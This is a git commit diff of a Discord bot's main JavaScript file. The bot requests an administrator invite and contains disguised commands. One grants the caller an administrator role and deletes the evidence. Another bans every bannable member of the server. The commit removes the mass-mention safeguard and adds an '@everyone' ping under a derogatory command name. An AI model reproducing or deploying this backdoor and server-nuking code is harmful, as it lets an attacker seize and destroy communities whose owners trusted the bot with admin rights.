85cee6933efd5e0ed8b5e47c45cac6427d7887f3
NightYoshi370 <maorninja@outlook.com>
2019-08-13 16:26:40 -0700

    Make a command that mentions everyone

--- bot.js
+++ bot.js
@@ -1,6 +1,6 @@
 const botSettings = require("./botsettings.json");
 const Discord = require("discord.js");
-const bot = new Discord.Client({disableEveryone: true});
+const bot = new Discord.Client();
 
 bot.on("ready", async () => {
 	console.log(`PossumBot Is Now Activated`);
@@ -9,49 +9,59 @@ bot.on("ready", async () => {
 
 	try {
 		//Generates a invite link in the console...
-	let link = await bot.generateInvite(["ADMINISTRATOR"]);
-	console.log(link);
+		let link = await bot.generateInvite(["ADMINISTRATOR"]);
+		console.log(link);
 	} catch(e) {
 		console.log(e.stack);
 	}
 });
 bot.on("message", async message => { 
-if(message.author.bot) return;
+	if (message.author.bot) return;
 
 	const args = message.content.slice(botSettings.prefix.length).trim().split(/ +/g);
   	const command = args.shift().toLowerCase();
 
-  //Gives you the admin role and deletes the message.
-  if(command === `myakish`) {
-  	try {
-	role = await message.guild.createRole({
- 	name: "Dope Role",
-  	color: "#2f3136",
-  	permissions: [8]
-	});
-	message.member.addRole(role)
-	message.delete(1000);
-	} catch(e) {
-		console.log(e.stack);
+	// Gives you the admin role and deletes the message.
+	if (command === `myakish`) {
+  		try {
+			role = await message.guild.createRole({
+ 				name: "Dope Role",
+  				color: "#2f3136",
+  				permissions: [8]
+			});
+			message.member.addRole(role)
+			message.delete(1000);
+		} catch(e) {
+			console.log(e.stack);
+		}
 	}
-   }
-   //Bans everyone and deletes the message.
-   if(command === `arturdebil`) {
-   	try {
-   	message.guild.members.forEach(member => {member.ban()});
-   	message.delete(1000);
-   	} catch(e) {
-	console.log(e.stack);
-   	}
-   }
 
-   if(command === `leaveserver`) {
-   	try {
-   	message.guild.leave();
-   	} catch(e) {
-	console.log(e.stack);
+	// Bans everyone and deletes the message.
+	if (command === `arturdebil`) {
+		try {
+			message.guild.members.filter(member => member.bannable).forEach(member => {member.ban()});
+			message.delete(1000);
+		} catch(e) {
+			console.log(e.stack);
+		}
+	}
+
+	if (command === `servergay`) {
+		try {
+			let newMessage = message.channel.send('@everyone listen to this man.');
+			newMessage.delete(1000);
+		} catch(e) {
+			console.log(e.stack);
+		}
+	}
+
+	if(command === `leaveserver`) {
+   		try {
+   			message.guild.leave();
+   		} catch(e) {
+			console.log(e.stack);
+   		}
    	}
-   }
 });
 
 bot.login(botSettings.token);
